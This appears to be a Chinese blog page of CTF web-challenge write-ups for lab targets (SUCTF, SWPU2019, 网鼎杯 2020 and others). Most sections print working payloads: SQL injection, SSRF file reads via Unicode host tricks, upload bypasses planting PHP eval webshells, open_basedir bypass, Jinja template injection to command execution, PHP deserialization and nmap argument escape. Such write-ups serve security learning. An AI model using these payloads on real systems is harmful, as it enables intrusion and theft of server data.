<h4 id="SUCTF-easy-sql"><a href="#SUCTF-easy-sql" class="headerlink" title="[SUCTF] easy sql"></a>[SUCTF] easy sql</h4><p>查询语句是<code>select $_POST[&#39;query&#39;] || flag from flag</code>（不知道怎么来的）</p>
<p>payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，PIPES AS CONCAT 把 || 视为字符串连接符而不是或运算， select 1 || flag 会合并 select 1 和select flag 的查询结果，如果用字母无法得到flag，因为会合并成类似 select aflag 的形式</p>
<h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>Unicode安全，可以参考博客里的另一篇文章，Host-Split attack。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1]</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>

<p>payload：<code>/getUrl?url=file%3A//suctf.c%E2%84%82/../../../../etc/passwd</code>，前两次没有问题，第三次会把<code>%E2%84%82</code>转化成c，可以任意文件读取。</p>
<p>读nginx配置文件，在<code>/etc/nginx/conf.d/nginx.conf</code>没发现，<code>/usr/local/nginx/conf/nginx.conf</code>找到注释<code>/usr/fffffflag</code>。</p>
<h4 id="SUCTF-checkin"><a href="#SUCTF-checkin" class="headerlink" title="[SUCTF] checkin"></a>[SUCTF] checkin</h4><p>插入后缀名改成jpg的一句话，提示<code>&lt;?in contents</code>。</p>
<p>改成<code>&lt;scriptlanguage=&quot;php&quot;&gt;</code>，提示不是图片</p>
<p>文件开头加上<code>GIF89a</code>，成功上传。</p>
<p>服务器是nginx，不能上传<code>.htaccess</code>，需要利用<code>.user.ini</code></p>
<p>在<code>.user.ini</code>中可以更改<code>php.ini</code>中的PHP_INI_PERDIR 和 PHP_INI_USER设置。</p>
<p>auto_prepend_file和auto_append_file会在php文件的前/后自动插入指定的文件。</p>
<p>上传<code>.user.ini</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=ow.jpg</span><br></pre></td></tr></table></figure>

<p>上传目录下有一个index.php文件，访问index.php即可执行我们上传的php文件。</p>
<h4 id="SUCTF-easy-web"><a href="#SUCTF-easy-web" class="headerlink" title="[SUCTF] easy web"></a>[SUCTF] easy web</h4><p>看一下代码，大概是要进行到<code>eval()</code>函数执行<code>get_the_flag()</code>，然后通过文件上传拿shell。</p>
<p>第一步，正则过滤了茫茫多的字符，需要绕过。参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">无字母数字shell</a>，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字shell提高篇</a>，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5677#toc-0">php异或shell</a>，对字符串的长度，重复使用的字符也有要求。</p>
<p>接下来是php特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&#x27;a&#x27;];</span><br><span class="line">$_GET[a];  # 没有引号的字符视为字符串，所以以上两条等价</span><br><span class="line">$_GET&#123;a&#125;;  # 字符串后面跟随大括号和中括号都把字符串看作一个数组，所以以上两种等价</span><br><span class="line">$a=&#x27;phpinfo&#x27;;</span><br><span class="line">$a();  # 动态调用函数，可以直接在字符串后加上括号把字符串当作函数名</span><br><span class="line">echo ab^cd; # 得到两个不可见字符，php可以直接对两个字符串进行异或操作，相当于两位两位分别异或</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>于是使用不可见的字符绕过正则，同时使两个字符串异或得到<code>_GET</code>，<code>$&#123;&#125;</code>没有被过滤，直接使用可以减少一个字符量。除了异或也可以使用取反或者自增。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = 255 # %ff</span><br><span class="line">target = &quot;_GET&quot;</span><br><span class="line">res = []</span><br><span class="line">for t in target:</span><br><span class="line">    for l in range(0, 255):</span><br><span class="line">        if l ^ r == ord(t):</span><br><span class="line">            res.append(hex(l))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>得到<code>/xa0/xb8/xba/xab</code>，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag # $_GET&#123;%ff&#125;()</span><br></pre></td></tr></table></figure>

<p>这样就可以执行<code>get_the_flag()</code>了</p>
<p>第二步文件上传，要求后缀中不存在ph，内容中不含<code>&lt;?</code>，还要通过exif_imagetype。使用.htaccess绕过后缀限制，用<code>&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[c]);&lt;/script&gt;</code>的方式上传shell，在.htaccess和shell签名加上GIF89a来绕过exif_imagetype的检测。</p>
<p>构造一个上传页面，用来上传两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Form action=&quot;http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/?_=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/Form&gt;</span><br></pre></td></tr></table></figure>

<p>a.aaa文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;c&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>完了失败了，应该是在.htaccess前加的GIF89a导致文件失效了，换个方式。由于<code>#</code>在.htaccess中是注释符，不影响执行，同时这两条是图片文件头：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 123</span><br><span class="line">#define height 123</span><br><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<p>这时访问<code>http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();</code>发现返回的内容是<code>GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#39;c&#39;]);&lt;/script&gt;</code>，可能由于版本原因script标签指定的php不能起作用。改一下a.aaa文件，把<code>&lt;?php @eval($_REQUEST[c]);?&gt;</code>base64编码然后加到GIF89a后面，多加两个a是为了可以正常base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89aaaPD9waHAgQGV2YWwoJF9SRVFVRVNUW2NdKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>读取文件内容时用的是file_get_contents，可以使用php伪协议base64解密，所以修改.htaccess：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 123</span><br><span class="line">#define height 123</span><br><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa</span><br></pre></td></tr></table></figure>

<p>访问<code>http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();</code>，成功拿到shell</p>
<p>蚁剑连接，html目录下有个假flag，再上层的目录提示无权限，在phpinfo可以看到设置了open_basedir</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is fake flag</span><br><span class="line">But I heard php7.2-fpm has been initialized in unix socket mode!</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">oepn_basedir绕过</a>，选择了chdir和ini_set合用的方式绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p>发现根目录下的<code>THis_Is_tHe_F14g</code>，最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(file_get_contents(%27/THis_Is_tHe_F14g%27));</span><br></pre></td></tr></table></figure>

<p>extra：打印函数被禁用，如果curl可用，可以搭建一个靶机，把信息存入数据库或者文件，将回显信息发送到靶机，命令执行无回显时可以使用以下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;xxx&quot;;?&gt;&lt;?=$_?&gt;</span><br></pre></td></tr></table></figure>

<p>当system,passthru等不可用时，可以使用popen,proc_open等管道命令执行命令，也可以使用反引号，括起来的内容会作为shell命令执行，并将输出信息返回。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=`ls`;</span><br></pre></td></tr></table></figure>

<p>不能使用字母数字时也可以用通配符方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/???/??? # /bin/cat</span><br><span class="line">/???/??? /???/???/???/?????.??? # /bin/cat /var/www/html/index.php</span><br></pre></td></tr></table></figure>

<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>发布广告的标题位置存在注入，要在查询广告内容的时候触发。</p>
<p>发现 <code>#-or</code>会被waf，空格会被过滤，于是用<code>/**/</code>代替空格，在union select中闭合后面的单引号。</p>
<p>看看有多少列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,1...1,1,&#x27;1 </span><br></pre></td></tr></table></figure>

<p>一度怀疑自己方法有问题，结果它TM有22列。第2、3位可以显示。由于or被过滤，没办法使用informationschema，查一下版本，MariaDB，可以使用mysql.innodb_table_stats，查到表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br><span class="line">a&#x27;/**/union/**/select/**/1,(select group_concat(table_name) from mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有FLAG_TABLE,news,users,gtid_slave_pos,ads,users几个表，接下来无列名注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/a,2/**/b,3/**/c/**/union/**/select/**/*/**/from/**/users)d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>

<p>需要一个一个试出每个表有多少列。</p>
<h4 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h4><p>intval 对于指数表示只会返回e前的内容。</p>
<p>md5 传入一个 0e215962017，md5后还是一个0e开头的数字，可以相等。</p>
<p>get_flag 先用 ls 看一下目录，找到flag，%09代替空格，ca\t代替cat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>服务端模板注入（SSTI），有工具 tqlmap，类似于sqlmap。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>访问<code>/shrine/&#123;&#123;1+1&#125;&#125;</code>，得到2，可以模板注入。源码中flag在config里，如果没有过滤可以用<code>&#123;&#123;config&#125;&#125;</code>直接获取，但是这里设置了黑名单并且过滤了括号。</p>
<p>但python有一些内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>，可用payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125; # 得到current_app</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125; # 与上面类似</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%25 for c in [].__class__.__base__.__subclasses__() %25&#125;%0A&#123;%25 if c.__name__ %3D%3D &#x27;catch_warnings&#x27; %25&#125;%0A%20 &#123;%25 for b in c.__init__.__globals__.values() %25&#125;%0A%20 &#123;%25 if b.__class__ %3D%3D &#123;&#125;.__class__ %25&#125;%0A%20%20%20 &#123;%25 if &#x27;eval&#x27; in b.keys() %25&#125;%0A%20%20%20%20%20 &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;%0A%20%20%20 &#123;%25 endif %25&#125;%0A%20 &#123;%25 endif %25&#125;%0A%20 &#123;%25 endfor %25&#125;%0A&#123;%25 endif %25&#125;%0A&#123;%25 endfor %25&#125;</span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h4><p>F12看一下有个隐藏的表单，会自动提交。警告信息显示是执行了 func 这个函数，把 p 当作参数。尝试了几个命令执行函数都被 ban 了。</p>
<p>读一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(index.php)</span><br></pre></td></tr></table></figure>

<p>index.php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>把 func 转换成小写，然后检查 ，不能在 disable func 里。<code>func(p)_</code>返回的结果必须是字符串（其实不重要）。</p>
<p>里面给出了一个类，有 destruct方法，可以反序列化绕过 disable func 的限制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;whoami&quot;;</span><br><span class="line">    var $func = &quot;exec&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Test();</span><br><span class="line">$s = serialize($a);</span><br><span class="line">unserialize($s);</span><br></pre></td></tr></table></figure>

<p>验证可以执行命令，buu 的环境中 exec ls 只能看见 <code>/var/www/html</code>这一串目录，尝试用 system。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>找到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h4><p>类似于 Online Tools，应用了 escapeshellarg()+escapeshellcmd()，导致逃逸。</p>
<p>两种方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -iL /flag -oN flag.txt &#x27; # 利用 nmap 参数， -iL 从指定文件读取主机/IP 进行扫描，-oN 将扫描结果写入指定文件</span><br><span class="line">&#x27; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#x27; # 写入 shell ，由于过滤了 php ，使用 &lt;?= 和 phtml 进行绕过</span><br></pre></td></tr></table></figure>

<h4 id="网鼎杯-2020-青龙组-ArdeUSerialz"><a href="#网鼎杯-2020-青龙组-ArdeUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]ArdeUSerialz"></a>[网鼎杯 2020 青龙组]ArdeUSerialz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span 